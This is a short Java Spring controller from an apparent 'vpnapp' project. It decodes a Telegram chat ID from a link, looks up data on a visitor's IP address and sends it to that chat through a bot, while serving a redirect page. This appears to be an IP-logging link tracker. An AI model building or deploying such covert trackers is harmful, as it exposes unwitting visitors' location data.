package org.pdp.vpnapp.controller;

import jakarta.servlet.http.HttpServletRequest;
import lombok.RequiredArgsConstructor;
import org.pdp.vpnapp.bot.TelegramBot;
import org.pdp.vpnapp.model.Information;
import org.pdp.vpnapp.utils.IpAddressUtils;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import java.util.Arrays;
import java.util.Base64;

@Controller
@RequestMapping("/")
@RequiredArgsConstructor
public class LinkController {

    private final TelegramBot telegramBot;

    @ResponseBody
    @GetMapping("/send/{ip}")
    public String getAndSendData(@PathVariable String ip, @RequestParam String url){
        Information data = IpAddressUtils.getData(ip);
        Long chatId = Long.parseLong(new String(Base64.getDecoder().decode(url)));
        telegramBot.sendData(data,chatId);
        return IpAddressUtils.links.get(chatId).get(url);
    }
    @GetMapping("/redirect/**")
    public String index(){
        return "index";
    }
}
